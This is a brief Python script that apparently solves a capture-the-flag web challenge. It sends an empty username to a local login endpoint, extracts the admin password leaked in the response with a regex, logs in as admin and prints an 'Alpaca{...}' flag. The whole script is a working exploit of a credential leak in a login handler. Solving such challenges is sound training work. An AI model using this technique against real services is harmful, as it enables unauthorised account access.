import os
import requests
import re

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))
URL = f"http://{HOST}:{PORT}/"

response = requests.post(f"{URL}login", data={"username": ""})
password = re.findall(r'password != "(.+)"', response.text)[0]

response = requests.post(f"{URL}login", data={"username": "admin", "password": password})
print(re.findall(r"Alpaca{.+}", response.text)[0])

